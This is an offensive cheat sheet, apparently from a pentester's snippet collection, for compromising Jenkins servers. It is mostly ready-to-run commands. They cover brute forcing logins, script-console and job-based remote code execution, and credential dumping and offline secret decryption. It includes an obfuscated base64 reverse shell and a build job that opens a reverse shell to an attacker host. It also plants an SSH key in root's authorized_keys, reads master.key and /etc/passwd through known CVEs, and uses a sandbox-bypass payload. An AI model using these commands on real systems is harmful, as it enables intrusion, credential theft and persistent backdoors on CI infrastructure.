---
id: "5yizhd9yemptl2n9i"
title: "jenkins"
description: ""
tags: []
order: 12
createdAt: "2026-05-31T09:34:43.014Z"
updatedAt: "2026-05-31T09:34:59.239Z"
---

## Reconnaissance
<!-- section: {"id":"itoh6qkk3mptl2z76","order":0,"collapsed":false} -->

### 4hmzmud1cmptl2z9g
```bash
nmap -sV -sC -p 8080,8443,50000 $TARGET
```

_Reconnaissance Detect Jenkins instance and version._

**Tags:** jenkins, recon, nmap
<!-- cmd: {"id":"4hmzmud1cmptl2z9g","language":"bash","sectionId":"itoh6qkk3mptl2z76","tags":["jenkins","recon","nmap"]} -->

### i8deewtfwmptl2z9l
```bash
curl -sI http://$TARGET:8080/ | grep -i "x-jenkins\|server"
```

**Tags:** jenkins, recon, nmap
<!-- cmd: {"id":"i8deewtfwmptl2z9l","language":"bash","sectionId":"itoh6qkk3mptl2z76","tags":["jenkins","recon","nmap"]} -->

### kh0r55mwzmptl2z9r
```bash
curl -s http://$TARGET:8080/api/json | python3 -m json.tool
```

**Tags:** jenkins, recon, nmap
<!-- cmd: {"id":"kh0r55mwzmptl2z9r","language":"bash","sectionId":"itoh6qkk3mptl2z76","tags":["jenkins","recon","nmap"]} -->

### 6ymaq690bmptl2z9x
```bash
curl -s http://$TARGET:8080/login | grep -i "jenkins"
```

**Tags:** jenkins, recon, nmap
<!-- cmd: {"id":"6ymaq690bmptl2z9x","language":"bash","sectionId":"itoh6qkk3mptl2z76","tags":["jenkins","recon","nmap"]} -->

## Unauthenticated Enumeration
<!-- section: {"id":"u4d0p81yrmptl2z7d","order":1,"collapsed":false} -->

### s31nax42jmptl2zab
```bash
curl -s http://$TARGET:8080/api/json
```

_Unauthenticated Enumeration_

**Tags:** jenkins, unauthenticated, enumeration
<!-- cmd: {"id":"s31nax42jmptl2zab","language":"bash","sectionId":"u4d0p81yrmptl2z7d","tags":["jenkins","unauthenticated","enumeration"]} -->

### kl13ymzbemptl2zag
```bash
curl -s http://$TARGET:8080/api/json?pretty=true
```

**Tags:** jenkins, unauthenticated, enumeration
<!-- cmd: {"id":"kl13ymzbemptl2zag","language":"bash","sectionId":"u4d0p81yrmptl2z7d","tags":["jenkins","unauthenticated","enumeration"]} -->

### iq303gx8kmptl2zam
```bash
curl -s "http://$TARGET:8080/api/json?tree=jobs[name,url,color]&pretty=true"
```

**Tags:** jenkins, unauthenticated, enumeration
<!-- cmd: {"id":"iq303gx8kmptl2zam","language":"bash","sectionId":"u4d0p81yrmptl2z7d","tags":["jenkins","unauthenticated","enumeration"]} -->

### 2yupdw16lmptl2zar
```bash
curl -sI http://$TARGET:8080/ | grep "X-Jenkins:"
```

**Tags:** jenkins, unauthenticated, enumeration
<!-- cmd: {"id":"2yupdw16lmptl2zar","language":"bash","sectionId":"u4d0p81yrmptl2z7d","tags":["jenkins","unauthenticated","enumeration"]} -->

### lhyqhr3ddmptl2zax
```bash
curl -s "http://$TARGET:8080/whoAmI/api/json?pretty=true"
```

**Tags:** jenkins, unauthenticated, enumeration
<!-- cmd: {"id":"lhyqhr3ddmptl2zax","language":"bash","sectionId":"u4d0p81yrmptl2z7d","tags":["jenkins","unauthenticated","enumeration"]} -->

### lvwe4dw2vmptl2zb1
```bash
curl -s http://$TARGET:8080/signup
```

**Tags:** jenkins, unauthenticated, enumeration
<!-- cmd: {"id":"lvwe4dw2vmptl2zb1","language":"bash","sectionId":"u4d0p81yrmptl2z7d","tags":["jenkins","unauthenticated","enumeration"]} -->

### gsx15pgb6mptl2zb6
```bash
curl -s "http://$TARGET:8080/securityRealm/createAccount"
```

**Tags:** jenkins, unauthenticated, enumeration
<!-- cmd: {"id":"gsx15pgb6mptl2zb6","language":"bash","sectionId":"u4d0p81yrmptl2z7d","tags":["jenkins","unauthenticated","enumeration"]} -->

### znapj1844mptl2zbb
```bash
curl -s http://$TARGET:8080/script -o /dev/null -w "%{http_code}"
```

**Tags:** jenkins, unauthenticated, enumeration
<!-- cmd: {"id":"znapj1844mptl2zbb","language":"bash","sectionId":"u4d0p81yrmptl2z7d","tags":["jenkins","unauthenticated","enumeration"]} -->

## Brute Force
<!-- section: {"id":"akin7obvtmptl2z7h","order":2,"collapsed":false} -->

### 6bhliat10mptl2zbt
```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt http-form-post://$TARGET:8080/j_spring_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password
```

_Brute Force_

**Tags:** jenkins, bruteforce, hydra, metasploit
<!-- cmd: {"id":"6bhliat10mptl2zbt","language":"bash","sectionId":"akin7obvtmptl2z7h","tags":["jenkins","bruteforce","hydra","metasploit"]} -->

### sheder3ldmptl2zby
```bash
use auxiliary/scanner/http/jenkins_login
```

**Tags:** jenkins, bruteforce, hydra, metasploit
<!-- cmd: {"id":"sheder3ldmptl2zby","language":"bash","sectionId":"akin7obvtmptl2z7h","tags":["jenkins","bruteforce","hydra","metasploit"]} -->

### rw08ahh1ymptl2zc3
```bash
set RHOSTS $TARGET
```

**Tags:** jenkins, bruteforce, hydra, metasploit
<!-- cmd: {"id":"rw08ahh1ymptl2zc3","language":"bash","sectionId":"akin7obvtmptl2z7h","tags":["jenkins","bruteforce","hydra","metasploit"]} -->

### s33prc0ukmptl2zc8
```bash
set RPORT 8080
```

**Tags:** jenkins, bruteforce, hydra, metasploit
<!-- cmd: {"id":"s33prc0ukmptl2zc8","language":"bash","sectionId":"akin7obvtmptl2z7h","tags":["jenkins","bruteforce","hydra","metasploit"]} -->

### jbtodzfscmptl2zcd
```bash
set USERNAME admin
```

**Tags:** jenkins, bruteforce, hydra, metasploit
<!-- cmd: {"id":"jbtodzfscmptl2zcd","language":"bash","sectionId":"akin7obvtmptl2z7h","tags":["jenkins","bruteforce","hydra","metasploit"]} -->

### r6i3bist4mptl2zcj
```bash
set PASS_FILE /usr/share/wordlists/rockyou.txt
```

**Tags:** jenkins, bruteforce, hydra, metasploit
<!-- cmd: {"id":"r6i3bist4mptl2zcj","language":"bash","sectionId":"akin7obvtmptl2z7h","tags":["jenkins","bruteforce","hydra","metasploit"]} -->

### tdr1qefyomptl2zcn
```bash
run
```

**Tags:** jenkins, bruteforce, hydra, metasploit
<!-- cmd: {"id":"tdr1qefyomptl2zcn","language":"bash","sectionId":"akin7obvtmptl2z7h","tags":["jenkins","bruteforce","hydra","metasploit"]} -->

## Authentication
<!-- section: {"id":"t6nwpimu6mptl2z7m","order":3,"collapsed":false} -->

### d41c4b0hvmptl2zcx
```bash
curl -s -c cookies.txt -b cookies.txt \
```

_Authentication_

**Tags:** jenkins, authentication, api-token
<!-- cmd: {"id":"d41c4b0hvmptl2zcx","language":"bash","sectionId":"t6nwpimu6mptl2z7m","tags":["jenkins","authentication","api-token"]} -->

### m05rauxysmptl2zd2
```bash
  -d "j_username=$USER&j_password=$PASS&from=%2F" \
```

**Tags:** jenkins, authentication, api-token
<!-- cmd: {"id":"m05rauxysmptl2zd2","language":"bash","sectionId":"t6nwpimu6mptl2z7m","tags":["jenkins","authentication","api-token"]} -->

### ktyamgexemptl2zd6
```bash
  http://$TARGET:8080/j_spring_security_check
```

**Tags:** jenkins, authentication, api-token
<!-- cmd: {"id":"ktyamgexemptl2zd6","language":"bash","sectionId":"t6nwpimu6mptl2z7m","tags":["jenkins","authentication","api-token"]} -->

### uklwo3kk7mptl2zdc
```bash
CRUMB=$(curl -su $USER:$PASS "http://$TARGET:8080/crumbIssuer/api/json" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['crumb'])")
```

**Tags:** jenkins, authentication, api-token
<!-- cmd: {"id":"uklwo3kk7mptl2zdc","language":"bash","sectionId":"t6nwpimu6mptl2z7m","tags":["jenkins","authentication","api-token"]} -->

### 93i9sb7hqmptl2zdh
```bash
CRUMB_FIELD=$(curl -su $USER:$PASS "http://$TARGET:8080/crumbIssuer/api/json" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['crumbRequestField'])")
```

**Tags:** jenkins, authentication, api-token
<!-- cmd: {"id":"93i9sb7hqmptl2zdh","language":"bash","sectionId":"t6nwpimu6mptl2z7m","tags":["jenkins","authentication","api-token"]} -->

### sukssw6vdmptl2zdm
```bash
curl -su $USER:$API_TOKEN http://$TARGET:8080/api/json
```

**Tags:** jenkins, authentication, api-token
<!-- cmd: {"id":"sukssw6vdmptl2zdm","language":"bash","sectionId":"t6nwpimu6mptl2z7m","tags":["jenkins","authentication","api-token"]} -->

## Script Console RCE (Groovy)
<!-- section: {"id":"ik3e6z6npmptl2z7r","order":4,"collapsed":false} -->

### 8o2yqwic2mptl2ze5
```bash
def cmd = "id"
```

_Script Console RCE (Groovy) The Jenkins Script Console runs arbitrary Groovy code — direct OS command execution._

**Tags:** jenkins, rce, groovy, script-console, exploitation
<!-- cmd: {"id":"8o2yqwic2mptl2ze5","language":"bash","sectionId":"ik3e6z6npmptl2z7r","tags":["jenkins","rce","groovy","script-console","exploitation"]} -->

### j1j824dkomptl2zea
```bash
def p = cmd.execute()
```

**Tags:** jenkins, rce, groovy, script-console, exploitation
<!-- cmd: {"id":"j1j824dkomptl2zea","language":"bash","sectionId":"ik3e6z6npmptl2z7r","tags":["jenkins","rce","groovy","script-console","exploitation"]} -->

### dzbohew3qmptl2zef
```bash
println p.text
```

**Tags:** jenkins, rce, groovy, script-console, exploitation
<!-- cmd: {"id":"dzbohew3qmptl2zef","language":"bash","sectionId":"ik3e6z6npmptl2z7r","tags":["jenkins","rce","groovy","script-console","exploitation"]} -->

### w7tl9vd8omptl2zej
```bash
def cmd = "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8kTEhPU1QvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}".execute()
```

**Tags:** jenkins, rce, groovy, script-console, exploitation
<!-- cmd: {"id":"w7tl9vd8omptl2zej","language":"bash","sectionId":"ik3e6z6npmptl2z7r","tags":["jenkins","rce","groovy","script-console","exploitation"]} -->

### qv8yqjg95mptl2zeo
```bash
curl -u $USER:$PASS http://$TARGET:8080/scriptText \
```

**Tags:** jenkins, rce, groovy, script-console, exploitation
<!-- cmd: {"id":"qv8yqjg95mptl2zeo","language":"bash","sectionId":"ik3e6z6npmptl2z7r","tags":["jenkins","rce","groovy","script-console","exploitation"]} -->

### 8m8e13hgpmptl2zes
```bash
  --data-urlencode 'script=def sout=new StringBuilder();def cmd=["bash","-c","id"].execute();cmd.waitForProcessOutput(sout,new StringBuilder());println(sout)' \
```

**Tags:** jenkins, rce, groovy, script-console, exploitation
<!-- cmd: {"id":"8m8e13hgpmptl2zes","language":"bash","sectionId":"ik3e6z6npmptl2z7r","tags":["jenkins","rce","groovy","script-console","exploitation"]} -->

### 1e9p12t9cmptl2zey
```bash
  -H "$CRUMB_FIELD: $CRUMB"
```

**Tags:** jenkins, rce, groovy, script-console, exploitation
<!-- cmd: {"id":"1e9p12t9cmptl2zey","language":"bash","sectionId":"ik3e6z6npmptl2z7r","tags":["jenkins","rce","groovy","script-console","exploitation"]} -->

### uvc7qk8n6mptl2zf3
```bash
def cmd = ["cmd", "/c", "whoami"].execute()
```

**Tags:** jenkins, rce, groovy, script-console, exploitation
<!-- cmd: {"id":"uvc7qk8n6mptl2zf3","language":"bash","sectionId":"ik3e6z6npmptl2z7r","tags":["jenkins","rce","groovy","script-console","exploitation"]} -->

### ki714x0lrmptl2zf8
```bash
println cmd.text
```

**Tags:** jenkins, rce, groovy, script-console, exploitation
<!-- cmd: {"id":"ki714x0lrmptl2zf8","language":"bash","sectionId":"ik3e6z6npmptl2z7r","tags":["jenkins","rce","groovy","script-console","exploitation"]} -->

### j03bqj4f1mptl2zfd
```bash
def file = new File("/etc/passwd")
```

**Tags:** jenkins, rce, groovy, script-console, exploitation
<!-- cmd: {"id":"j03bqj4f1mptl2zfd","language":"bash","sectionId":"ik3e6z6npmptl2z7r","tags":["jenkins","rce","groovy","script-console","exploitation"]} -->

### h50fmg5x8mptl2zfh
```bash
println file.text
```

**Tags:** jenkins, rce, groovy, script-console, exploitation
<!-- cmd: {"id":"h50fmg5x8mptl2zfh","language":"bash","sectionId":"ik3e6z6npmptl2z7r","tags":["jenkins","rce","groovy","script-console","exploitation"]} -->

### cvgl9644zmptl2zfm
```bash
new File("/root/.ssh/authorized_keys") << "ssh-rsa AAAA..."
```

**Tags:** jenkins, rce, groovy, script-console, exploitation
<!-- cmd: {"id":"cvgl9644zmptl2zfm","language":"bash","sectionId":"ik3e6z6npmptl2z7r","tags":["jenkins","rce","groovy","script-console","exploitation"]} -->

## Job-Based RCE
<!-- section: {"id":"2e5yv6fg7mptl2z7w","order":5,"collapsed":false} -->

### h79tol8txmptl2zfy
```bash
curl -u $USER:$PASS -X POST "http://$TARGET:8080/createItem?name=pwn" \
```

_Job-Based RCE Create or modify Jenkins jobs to execute OS commands._

**Tags:** jenkins, job, rce, exploitation
<!-- cmd: {"id":"h79tol8txmptl2zfy","language":"bash","sectionId":"2e5yv6fg7mptl2z7w","tags":["jenkins","job","rce","exploitation"]} -->

### 3x0d5ppbpmptl2zg3
```bash
  -H "$CRUMB_FIELD: $CRUMB" \
```

**Tags:** jenkins, job, rce, exploitation
<!-- cmd: {"id":"3x0d5ppbpmptl2zg3","language":"bash","sectionId":"2e5yv6fg7mptl2z7w","tags":["jenkins","job","rce","exploitation"]} -->

### ibpcfhbglmptl2zg8
```bash
  -H "Content-Type: text/xml" \
```

**Tags:** jenkins, job, rce, exploitation
<!-- cmd: {"id":"ibpcfhbglmptl2zg8","language":"bash","sectionId":"2e5yv6fg7mptl2z7w","tags":["jenkins","job","rce","exploitation"]} -->

### ls74ksaavmptl2zgd
```bash
  -d '<project><builders><hudson.tasks.Shell><command>bash -i &gt;&amp; /dev/tcp/$LHOST/4444 0&gt;&amp;1</command></hudson.tasks.Shell></builders></project>'
```

**Tags:** jenkins, job, rce, exploitation
<!-- cmd: {"id":"ls74ksaavmptl2zgd","language":"bash","sectionId":"2e5yv6fg7mptl2z7w","tags":["jenkins","job","rce","exploitation"]} -->

### oxz06db57mptl2zgh
```bash
curl -u $USER:$PASS -X POST "http://$TARGET:8080/job/pwn/build" \
```

**Tags:** jenkins, job, rce, exploitation
<!-- cmd: {"id":"oxz06db57mptl2zgh","language":"bash","sectionId":"2e5yv6fg7mptl2z7w","tags":["jenkins","job","rce","exploitation"]} -->

### k2kkrjwtlmptl2zgm
```bash
  -H "$CRUMB_FIELD: $CRUMB"
```

**Tags:** jenkins, job, rce, exploitation
<!-- cmd: {"id":"k2kkrjwtlmptl2zgm","language":"bash","sectionId":"2e5yv6fg7mptl2z7w","tags":["jenkins","job","rce","exploitation"]} -->

### 2a6crmt6omptl2zgs
```bash
curl -u $USER:$PASS "http://$TARGET:8080/job/$JOB/lastBuild/consoleText"
```

**Tags:** jenkins, job, rce, exploitation
<!-- cmd: {"id":"2a6crmt6omptl2zgs","language":"bash","sectionId":"2e5yv6fg7mptl2z7w","tags":["jenkins","job","rce","exploitation"]} -->

### tzhypcai9mptl2zgw
```bash
use exploit/multi/http/jenkins_script_console
```

**Tags:** jenkins, job, rce, exploitation
<!-- cmd: {"id":"tzhypcai9mptl2zgw","language":"bash","sectionId":"2e5yv6fg7mptl2z7w","tags":["jenkins","job","rce","exploitation"]} -->

### 0g6efbl7amptl2zh1
```bash
set RHOSTS $TARGET
```

**Tags:** jenkins, job, rce, exploitation
<!-- cmd: {"id":"0g6efbl7amptl2zh1","language":"bash","sectionId":"2e5yv6fg7mptl2z7w","tags":["jenkins","job","rce","exploitation"]} -->

### btdh75irimptl2zh5
```bash
set RPORT 8080
```

**Tags:** jenkins, job, rce, exploitation
<!-- cmd: {"id":"btdh75irimptl2zh5","language":"bash","sectionId":"2e5yv6fg7mptl2z7w","tags":["jenkins","job","rce","exploitation"]} -->

### 9npvg3hlgmptl2zhb
```bash
set USERNAME $USER
```

**Tags:** jenkins, job, rce, exploitation
<!-- cmd: {"id":"9npvg3hlgmptl2zhb","language":"bash","sectionId":"2e5yv6fg7mptl2z7w","tags":["jenkins","job","rce","exploitation"]} -->

### a9o8bmx7hmptl2zhg
```bash
set PASSWORD $PASS
```

**Tags:** jenkins, job, rce, exploitation
<!-- cmd: {"id":"a9o8bmx7hmptl2zhg","language":"bash","sectionId":"2e5yv6fg7mptl2z7w","tags":["jenkins","job","rce","exploitation"]} -->

### 5d8vnfzt3mptl2zhl
```bash
set LHOST $LHOST
```

**Tags:** jenkins, job, rce, exploitation
<!-- cmd: {"id":"5d8vnfzt3mptl2zhl","language":"bash","sectionId":"2e5yv6fg7mptl2z7w","tags":["jenkins","job","rce","exploitation"]} -->

### 649n0t15lmptl2zhq
```bash
run
```

**Tags:** jenkins, job, rce, exploitation
<!-- cmd: {"id":"649n0t15lmptl2zhq","language":"bash","sectionId":"2e5yv6fg7mptl2z7w","tags":["jenkins","job","rce","exploitation"]} -->

## Credential Extraction
<!-- section: {"id":"6o8p2tjiwmptl2z82","order":6,"collapsed":false} -->

### enxinibi1mptl2zi9
```bash
import com.cloudbees.plugins.credentials.*
```

_Credential Extraction Jenkins stores credentials in secrets/ — accessible via Groovy._

**Tags:** jenkins, credentials, secrets, post-exploitation
<!-- cmd: {"id":"enxinibi1mptl2zi9","language":"bash","sectionId":"6o8p2tjiwmptl2z82","tags":["jenkins","credentials","secrets","post-exploitation"]} -->

### henf0fd3smptl2zie
```bash
import com.cloudbees.plugins.credentials.impl.*
```

**Tags:** jenkins, credentials, secrets, post-exploitation
<!-- cmd: {"id":"henf0fd3smptl2zie","language":"bash","sectionId":"6o8p2tjiwmptl2z82","tags":["jenkins","credentials","secrets","post-exploitation"]} -->

### b8tu2eudvmptl2zij
```bash
import com.cloudbees.jenkins.plugins.sshcredentials.impl.*
```

**Tags:** jenkins, credentials, secrets, post-exploitation
<!-- cmd: {"id":"b8tu2eudvmptl2zij","language":"bash","sectionId":"6o8p2tjiwmptl2z82","tags":["jenkins","credentials","secrets","post-exploitation"]} -->

### v14v1tpdnmptl2zio
```bash
import org.jenkinsci.plugins.plaincredentials.*
```

**Tags:** jenkins, credentials, secrets, post-exploitation
<!-- cmd: {"id":"v14v1tpdnmptl2zio","language":"bash","sectionId":"6o8p2tjiwmptl2z82","tags":["jenkins","credentials","secrets","post-exploitation"]} -->

### 0my4sqg8dmptl2zit
```bash
def creds = com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(
```

**Tags:** jenkins, credentials, secrets, post-exploitation
<!-- cmd: {"id":"0my4sqg8dmptl2zit","language":"bash","sectionId":"6o8p2tjiwmptl2z82","tags":["jenkins","credentials","secrets","post-exploitation"]} -->

### o2b3puzz9mptl2zix
```bash
  com.cloudbees.plugins.credentials.common.StandardCredentials.class,
```

**Tags:** jenkins, credentials, secrets, post-exploitation
<!-- cmd: {"id":"o2b3puzz9mptl2zix","language":"bash","sectionId":"6o8p2tjiwmptl2z82","tags":["jenkins","credentials","secrets","post-exploitation"]} -->

### etzehrfc1mptl2zj2
```bash
  jenkins.model.Jenkins.instance, null, null)
```

**Tags:** jenkins, credentials, secrets, post-exploitation
<!-- cmd: {"id":"etzehrfc1mptl2zj2","language":"bash","sectionId":"6o8p2tjiwmptl2z82","tags":["jenkins","credentials","secrets","post-exploitation"]} -->

### sc53yikwwmptl2zj7
```bash
for(c in creds) {
```

**Tags:** jenkins, credentials, secrets, post-exploitation
<!-- cmd: {"id":"sc53yikwwmptl2zj7","language":"bash","sectionId":"6o8p2tjiwmptl2z82","tags":["jenkins","credentials","secrets","post-exploitation"]} -->

### 51v28pw9smptl2zjd
```bash
  if(c instanceof UsernamePasswordCredentialsImpl) {
```

**Tags:** jenkins, credentials, secrets, post-exploitation
<!-- cmd: {"id":"51v28pw9smptl2zjd","language":"bash","sectionId":"6o8p2tjiwmptl2z82","tags":["jenkins","credentials","secrets","post-exploitation"]} -->

### 5yofcy2szmptl2zjg
```bash
    println("Username: ${c.username} Password: ${c.password}")
```

**Tags:** jenkins, credentials, secrets, post-exploitation
<!-- cmd: {"id":"5yofcy2szmptl2zjg","language":"bash","sectionId":"6o8p2tjiwmptl2z82","tags":["jenkins","credentials","secrets","post-exploitation"]} -->

### 1xkzq7n6umptl2zjl
```bash
  } else if(c instanceof StringCredentialsImpl) {
```

**Tags:** jenkins, credentials, secrets, post-exploitation
<!-- cmd: {"id":"1xkzq7n6umptl2zjl","language":"bash","sectionId":"6o8p2tjiwmptl2z82","tags":["jenkins","credentials","secrets","post-exploitation"]} -->

### 40t6yba0imptl2zjq
```bash
    println("Secret: ${c.secret}")
```

**Tags:** jenkins, credentials, secrets, post-exploitation
<!-- cmd: {"id":"40t6yba0imptl2zjq","language":"bash","sectionId":"6o8p2tjiwmptl2z82","tags":["jenkins","credentials","secrets","post-exploitation"]} -->

### ya3iw1kz1mptl2zjv
```bash
  } else if(c instanceof BasicSSHUserPrivateKey) {
```

**Tags:** jenkins, credentials, secrets, post-exploitation
<!-- cmd: {"id":"ya3iw1kz1mptl2zjv","language":"bash","sectionId":"6o8p2tjiwmptl2z82","tags":["jenkins","credentials","secrets","post-exploitation"]} -->

### hfetzr46pmptl2zjz
```bash
    println("SSH Key User: ${c.username}\n${c.privateKeySource.privateKey}")
```

**Tags:** jenkins, credentials, secrets, post-exploitation
<!-- cmd: {"id":"hfetzr46pmptl2zjz","language":"bash","sectionId":"6o8p2tjiwmptl2z82","tags":["jenkins","credentials","secrets","post-exploitation"]} -->

### nn2695ysdmptl2zk6
```bash
  }
```

**Tags:** jenkins, credentials, secrets, post-exploitation
<!-- cmd: {"id":"nn2695ysdmptl2zk6","language":"bash","sectionId":"6o8p2tjiwmptl2z82","tags":["jenkins","credentials","secrets","post-exploitation"]} -->

### h761vkj87mptl2zka
```bash
  println("ID: ${c.id} Desc: ${c.description}")
```

**Tags:** jenkins, credentials, secrets, post-exploitation
<!-- cmd: {"id":"h761vkj87mptl2zka","language":"bash","sectionId":"6o8p2tjiwmptl2z82","tags":["jenkins","credentials","secrets","post-exploitation"]} -->

### qqy5bo1demptl2zkf
```bash
}
```

**Tags:** jenkins, credentials, secrets, post-exploitation
<!-- cmd: {"id":"qqy5bo1demptl2zkf","language":"bash","sectionId":"6o8p2tjiwmptl2z82","tags":["jenkins","credentials","secrets","post-exploitation"]} -->

## Secret Decryption (Offline)
<!-- section: {"id":"wxeoome16mptl2z86","order":7,"collapsed":false} -->

### nmal60o9wmptl2zl0
```bash
cat /var/lib/jenkins/secrets/master.key
```

_Secret Decryption (Offline)_

**Tags:** jenkins, decryption, credentials, offline
<!-- cmd: {"id":"nmal60o9wmptl2zl0","language":"bash","sectionId":"wxeoome16mptl2z86","tags":["jenkins","decryption","credentials","offline"]} -->

### 6mczr8hgtmptl2zl5
```bash
cat /var/lib/jenkins/secrets/hudson.util.Secret
```

**Tags:** jenkins, decryption, credentials, offline
<!-- cmd: {"id":"6mczr8hgtmptl2zl5","language":"bash","sectionId":"wxeoome16mptl2z86","tags":["jenkins","decryption","credentials","offline"]} -->

### b3gx1s75dmptl2zl9
```bash
cat /var/lib/jenkins/credentials.xml
```

**Tags:** jenkins, decryption, credentials, offline
<!-- cmd: {"id":"b3gx1s75dmptl2zl9","language":"bash","sectionId":"wxeoome16mptl2z86","tags":["jenkins","decryption","credentials","offline"]} -->

### 28vmnpzsamptl2zle
```bash
git clone https://github.com/hoto/jenkins-credentials-decryptor
```

**Tags:** jenkins, decryption, credentials, offline
<!-- cmd: {"id":"28vmnpzsamptl2zle","language":"bash","sectionId":"wxeoome16mptl2z86","tags":["jenkins","decryption","credentials","offline"]} -->

### 7ufy7rcpjmptl2zlk
```bash
./jenkins-credentials-decryptor \
```

**Tags:** jenkins, decryption, credentials, offline
<!-- cmd: {"id":"7ufy7rcpjmptl2zlk","language":"bash","sectionId":"wxeoome16mptl2z86","tags":["jenkins","decryption","credentials","offline"]} -->

### ut82i51i2mptl2zlp
```bash
  -m /var/lib/jenkins/secrets/master.key \
```

**Tags:** jenkins, decryption, credentials, offline
<!-- cmd: {"id":"ut82i51i2mptl2zlp","language":"bash","sectionId":"wxeoome16mptl2z86","tags":["jenkins","decryption","credentials","offline"]} -->

### fr9nllv53mptl2zlu
```bash
  -s /var/lib/jenkins/secrets/hudson.util.Secret \
```

**Tags:** jenkins, decryption, credentials, offline
<!-- cmd: {"id":"fr9nllv53mptl2zlu","language":"bash","sectionId":"wxeoome16mptl2z86","tags":["jenkins","decryption","credentials","offline"]} -->

### 89unwhew7mptl2zlz
```bash
  -c /var/lib/jenkins/credentials.xml
```

**Tags:** jenkins, decryption, credentials, offline
<!-- cmd: {"id":"89unwhew7mptl2zlz","language":"bash","sectionId":"wxeoome16mptl2z86","tags":["jenkins","decryption","credentials","offline"]} -->

### rs3mov3txmptl2zm4
```bash
println(hudson.util.Secret.fromString("{AQAAABAAAAAQ...}").getPlainText())
```

**Tags:** jenkins, decryption, credentials, offline
<!-- cmd: {"id":"rs3mov3txmptl2zm4","language":"bash","sectionId":"wxeoome16mptl2z86","tags":["jenkins","decryption","credentials","offline"]} -->

## Enumeration (Authenticated)
<!-- section: {"id":"10z1oahhdmptl2z8c","order":8,"collapsed":false} -->

### x0cawz1t0mptl2zml
```bash
curl -su $USER:$PASS "http://$TARGET:8080/api/json?tree=jobs[name,builds[number,result]]&pretty=true"
```

_Enumeration (Authenticated)_

**Tags:** jenkins, enumeration, authenticated
<!-- cmd: {"id":"x0cawz1t0mptl2zml","language":"bash","sectionId":"10z1oahhdmptl2z8c","tags":["jenkins","enumeration","authenticated"]} -->

### 3igcsbl6hmptl2zmp
```bash
curl -su $USER:$PASS "http://$TARGET:8080/job/$JOB/lastBuild/consoleText"
```

**Tags:** jenkins, enumeration, authenticated
<!-- cmd: {"id":"3igcsbl6hmptl2zmp","language":"bash","sectionId":"10z1oahhdmptl2z8c","tags":["jenkins","enumeration","authenticated"]} -->

### mkfiaxa23mptl2zmv
```bash
curl -su $USER:$PASS "http://$TARGET:8080/job/$JOB/config.xml"
```

**Tags:** jenkins, enumeration, authenticated
<!-- cmd: {"id":"mkfiaxa23mptl2zmv","language":"bash","sectionId":"10z1oahhdmptl2z8c","tags":["jenkins","enumeration","authenticated"]} -->

### b2dsauxubmptl2zn0
```bash
curl -su $USER:$PASS "http://$TARGET:8080/asynchPeople/api/json?pretty=true"
```

**Tags:** jenkins, enumeration, authenticated
<!-- cmd: {"id":"b2dsauxubmptl2zn0","language":"bash","sectionId":"10z1oahhdmptl2z8c","tags":["jenkins","enumeration","authenticated"]} -->

### fqexbm0xfmptl2zn6
```bash
curl -su $USER:$PASS "http://$TARGET:8080/pluginManager/api/json?depth=1&pretty=true"
```

**Tags:** jenkins, enumeration, authenticated
<!-- cmd: {"id":"fqexbm0xfmptl2zn6","language":"bash","sectionId":"10z1oahhdmptl2z8c","tags":["jenkins","enumeration","authenticated"]} -->

### 0a5hu2hotmptl2zna
```bash
curl -su $USER:$PASS "http://$TARGET:8080/computer/api/json?pretty=true"
```

**Tags:** jenkins, enumeration, authenticated
<!-- cmd: {"id":"0a5hu2hotmptl2zna","language":"bash","sectionId":"10z1oahhdmptl2z8c","tags":["jenkins","enumeration","authenticated"]} -->

## Agent/Node Exploitation
<!-- section: {"id":"cawsmjayomptl2z8g","order":9,"collapsed":false} -->

### omxglq6hgmptl2znv
```bash
cat /var/lib/jenkins/nodes/*/config.xml
```

_Agent/Node Exploitation_

**Tags:** jenkins, agent, node
<!-- cmd: {"id":"omxglq6hgmptl2znv","language":"bash","sectionId":"cawsmjayomptl2z8g","tags":["jenkins","agent","node"]} -->

### tttz8r75tmptl2zo0
```bash
grep -r "secret" /var/lib/jenkins/ 2>/dev/null
```

**Tags:** jenkins, agent, node
<!-- cmd: {"id":"tttz8r75tmptl2zo0","language":"bash","sectionId":"cawsmjayomptl2z8g","tags":["jenkins","agent","node"]} -->

### x6tv0yr2amptl2zo5
```bash
curl -su $USER:$PASS "http://$TARGET:8080/computer/$AGENT/slave-agent.jnlp"
```

**Tags:** jenkins, agent, node
<!-- cmd: {"id":"x6tv0yr2amptl2zo5","language":"bash","sectionId":"cawsmjayomptl2z8g","tags":["jenkins","agent","node"]} -->

## Common CVEs
<!-- section: {"id":"bz26i7mknmptl2z8k","order":10,"collapsed":false} -->

### zjz8j5mlamptl2zoo
```bash
java -jar jenkins-cli.jar -s http://$TARGET:8080 help "@/etc/passwd"
```

_Common CVEs_

**Tags:** jenkins, cve, exploitation, deserialization
<!-- cmd: {"id":"zjz8j5mlamptl2zoo","language":"bash","sectionId":"bz26i7mknmptl2z8k","tags":["jenkins","cve","exploitation","deserialization"]} -->

### hlx86t5cumptl2zov
```bash
java -jar jenkins-cli.jar -s http://$TARGET:8080 help "@/var/lib/jenkins/secrets/master.key"
```

**Tags:** jenkins, cve, exploitation, deserialization
<!-- cmd: {"id":"hlx86t5cumptl2zov","language":"bash","sectionId":"bz26i7mknmptl2z8k","tags":["jenkins","cve","exploitation","deserialization"]} -->

### r0935f533mptl2zp0
```bash
curl -s "http://$TARGET:8080/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=public+class+T+{+@groovy.transform.ToString+@groovy.transform.CompileStatic+def+run()+{+%22id%22.execute().text+}+}"
```

**Tags:** jenkins, cve, exploitation, deserialization
<!-- cmd: {"id":"r0935f533mptl2zp0","language":"bash","sectionId":"bz26i7mknmptl2z8k","tags":["jenkins","cve","exploitation","deserialization"]} -->

### xn0n5aq39mptl2zp4
```bash
python exploit.py $TARGET 8080
```

**Tags:** jenkins, cve, exploitation, deserialization
<!-- cmd: {"id":"xn0n5aq39mptl2zp4","language":"bash","sectionId":"bz26i7mknmptl2z8k","tags":["jenkins","cve","exploitation","deserialization"]} -->

